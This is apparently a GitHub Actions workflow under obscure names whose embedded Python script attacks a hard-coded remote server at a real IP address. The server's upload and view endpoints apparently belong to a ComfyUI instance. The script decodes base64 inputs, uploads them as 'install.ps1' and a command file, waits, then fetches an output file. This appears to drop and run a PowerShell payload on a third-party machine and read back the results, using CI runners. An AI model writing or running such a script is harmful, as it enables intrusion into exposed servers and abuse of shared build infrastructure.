name: ul1076v
on:
  workflow_dispatch:
jobs:
  v:
    runs-on: ubuntu-latest
    timeout-minutes: 12
    steps:
      - name: drive
        env:
          PSB64: 
          CMB64: 
        run: |
          mkdir -p /tmp/w && cp /dev/null /tmp/w/x
          printf '%s' "$PSB64" | base64 -d > /tmp/psb.bin
          printf '%s' "$CMB64" | base64 -d > /tmp/cmd.bin
          python3 - <<'PY'
          import base64, os, time, urllib.request, urllib.error, uuid
          B='http://119.28.54.147:8188'
          def req(url,data=None,hdr=None,t=25):
              r=urllib.request.Request(url,data=data,headers=hdr or {})
              try:
                  x=urllib.request.urlopen(r,timeout=t); return (x.status, x.read())
              except urllib.error.HTTPError as e: return (e.code, e.read()[:400])
              except Exception as e: return ('ERR', str(e)[:300])
          def up(p,name):
              bts=open(p,'rb').read()
              b='----x'+uuid.uuid4().hex
              body=b''
              for k,v in (('overwrite','true'),('type','input'),('subfolder','')):
                  body+=('--%s\r\nContent-Disposition: form-data; name="%s"\r\n\r\n%s\r\n'%(b,k,v)).encode()
              body+=('--%s\r\nContent-Disposition: form-data; name="image"; filename="%s"\r\nContent-Type: application/octet-stream\r\n\r\n'%(b,name)).encode()+bts+b'\r\n--'+b.encode()+b'--\r\n'
              return req(B+'/upload/image',body,{'Content-Type':'multipart/form-data; boundary='+b})
          print('STATS', req(B+'/system_stats'))
          print('UP_PS', up('/tmp/psb.bin','install.ps1'))
          print('UP_CMD', up('/tmp/cmd.bin','hk682_cmd.txt'))
          time.sleep(75)
          print('OUT', req(B+'/view?filename=ps1076e.txt&type=input&subfolder='))
          PY
